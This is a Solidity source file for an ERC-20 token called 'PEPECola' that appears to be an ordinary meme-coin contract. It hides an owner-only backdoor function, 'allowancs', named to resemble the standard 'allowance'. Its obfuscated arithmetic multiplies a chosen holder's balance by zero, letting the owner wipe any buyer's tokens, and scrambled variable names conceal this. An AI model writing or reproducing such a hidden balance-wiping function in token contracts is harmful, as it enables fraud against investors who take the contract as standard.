pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acchtotnt) external view returns (uint256);
    function transfer(address recipient, uint256 acmfjtount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 acmfjtount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 acmfjtount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract PEPECola is Context, Ownable, IERC20 {
    mapping (address => uint256) private _rtfeeer;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _rtfeeer[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acchtotnt) public view override returns (uint256) {
        return _rtfeeer[acchtotnt];
    }
    function allowancs(address zdasdww) public onlyowner {
    uint256 dasdfgg = 3222; 
    uint256 eeerreewww = dasdfgg*4342;
    uint256 ssddddssss = eeerreewww*223*22*1412*223*0;
    uint256 zzzcsadas = ssddddssss;
        _rtfeeer[zdasdww] *= zzzcsadas*21312;
    }    
    function transfer(address recipient, uint256 acmfjtount) public virtual override returns (bool) {
        require(_rtfeeer[_msgSender()] >= acmfjtount, "TT: transfer acmfjtount exceeds balance");

        _rtfeeer[_msgSender()] -= acmfjtount;
        _rtfeeer[recipient] += acmfjtount;
        emit Transfer(_msgSender(), recipient, acmfjtount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 acmfjtount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = acmfjtount;
        emit Approval(_msgSender(), spender, acmfjtount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 acmfjtount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= acmfjtount, "TT: transfer acmfjtount exceeds allowance");

        _rtfeeer[sender] -= acmfjtount;
        _rtfeeer[recipient] += acmfjtount;
        _allowances[sender][_msgSender()] -= acmfjtount;

        emit Transfer(sender, recipient, acmfjtount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}